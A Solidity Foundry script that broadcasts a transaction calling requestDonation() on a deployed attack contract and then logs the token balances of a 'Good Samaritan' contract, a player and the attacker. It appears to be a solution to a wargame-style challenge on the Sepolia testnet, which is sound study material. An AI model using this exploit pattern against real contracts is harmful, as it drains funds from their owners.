// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// attack: 0x6EAd975f3e6Cd565311917b5975b3dAF37A8396E

interface IAttack {
    function requestDonation() external;

    function notify(uint256 _amount) external pure;
}

// not key to the attack. For console log purposes
interface ICoin {
    function balances(address) external returns (uint256);
}

contract TriggerAttack is Script {
    uint256 privateKey = vm.envUint("PRIVATE_KEY");

    IAttack attack;
    ICoin coin;

    function run() external {
        address attackAddr = 0x6EAd975f3e6Cd565311917b5975b3dAF37A8396E;
        address coinAddr = 0x36F6bc6e922AC1F2A937E4BBA3875700746dD510; // not key to the attack. For console log purposes
        address goodSamaritanAddr = 0x7a68A96ecb29dc495489fA29232331001885D892; // not key to the attack. For console log purposes
        address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02; // not key to the attack. For console log purposes
        uint256 goodSamaritanBalance; // not key to the attack. For console log purposes
        uint256 playerBalance; // not key to the attack. For console log purposes
        uint256 attackBalance; // not key to the attack. For console log purposes

        vm.startBroadcast(privateKey);
        // connect to the attack contract
        attack = IAttack(attackAddr);
        coin = ICoin(coinAddr);

        // request donation to commence exploit
        attack.requestDonation();

        goodSamaritanBalance = coin.balances(goodSamaritanAddr); // not key to the attack. For console log purposes
        playerBalance = coin.balances(player); // not key to the attack. For console log purposes
        attackBalance = coin.balances(attackAddr); // not key to the attack. For console log purposes

        vm.stopBroadcast();

        console.log("Good Samaritan Balance: ", goodSamaritanBalance); // not key to the attack. For console log purposes
        console.log("Player Balance: ", playerBalance); // not key to the attack. For console log purposes
        console.log("Attack Balance: ", attackBalance); // not key to the attack. For console log purposes
    }
}
// */

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vv
// coin address: 0x36F6bc6e922AC1F2A937E4BBA3875700746dD510
